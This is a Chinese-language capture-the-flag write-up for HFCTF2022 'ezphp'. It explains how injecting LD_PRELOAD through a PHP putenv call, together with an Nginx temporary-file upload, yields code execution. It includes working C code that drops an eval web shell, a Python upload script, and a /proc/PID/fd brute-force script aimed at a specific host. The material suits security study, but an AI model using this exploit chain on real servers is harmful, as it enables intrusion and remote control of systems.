# [HFCTF2022]ezphp

```php
<?php 
(empty($_GET["env"])) ? highlight_file(__FILE__) : putenv($_GET["env"]) && system('echo hfctf2022');?>
```

上传恶意的.so文件，并通过设置LD_PRELOAD，然后调用新进程来加载恶意.so文件，达到绕过的效果。

#### LD_PRELOAD

LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。

#### 程序的链接方式

1. 静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。
2. 装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。
3. 运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。

对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。但是由于程序是在运行时动态加载，这就存在一个问题，假如程序动态加载的函数是恶意的，就有可能导致disable_function被绕过。

#### 上传.so文件

如果打开一个进程打开了某个文件，某个文件就会出现在 `/proc/PID/fd/` 目录下，但是如果这个文件在没有被关闭的情况下就被删除了或是中断了，我们依然可以读取到文件内容。

#### 查找进程pid

Nginx 会有很多 Worker 进程，但是一般来说 Worker 数量不会超过 cpu 核心数量，我们可以通过 `/proc/cpuinfo` 中的 processor 个数得到 cpu 数量，我们可以对比找到的 Nginx Worker Pid 数量以及 CPU 数量来校验我们大概找的对不对。同样我们可以爆破pid得到文件位置，如果题目给了docker，那就可以现在本地查找文件存放的位置。

#### 编译.so文件

先写一个c文件：

```c++
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    system("echo \"<?php eval($_POST[cmd]);?>\" > /var/www/html/shell.php");
}
```

放到kali中，使用gcc转换为so文件

```
gcc -shared -fPIC 1.c -o 1.so
```

增大so文件的大小，在so文件尾部加入脏字符：

```
var=`dd if=/dev/zero bs=1c count=10000 | tr '\0' 'c'`
echo $var >> 1.so
```

可以看到so文件大小增大。

运行脚本：

`gen_tmp.py`向网站发包：

```python
from threading import Thread
import requests
import socket
import time

port = 28077
host = "1.14.71.254"


def do_so():
    data = open("1.so", "rb").read()

    packet = f"""POST /index.php HTTP/1.1\r\nHOST:{host}:{port}\r\nContent-Length:{len(data) + 11}\r\n\r\n"""
    packet = packet.encode()

    packet += data
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(packet)
    time.sleep(10)
    s.close()


if __name__ == "__main__":
    do_so()
```

`brute.py`爆破一下pid(其实可以在docker中直接查找临时文件的位置，但是爆破同样也很快，还不用动脑子。)

```python
import requests
from threading import Thread

port = 28077
host = "1.14.71.254"

def ldload(pid, fd):
   sopath = f"/proc/{pid}/fd/{fd}"
   print(sopath)
   r = requests.get(f"http://{host}:{port}/index.php", params={"env":f"LD_PRELOAD={sopath}"})
   return r

if __name__ == "__main__":
   # ldload(20, 20)
   for pid in range(12, 40):
       for fd in range(1, 40):
           t = Thread(target=ldload, args=(pid, fd))
           t.start()
```

发现shell.php可以访问

原文https://www.cnblogs.com/dre0m1/p/16059950.html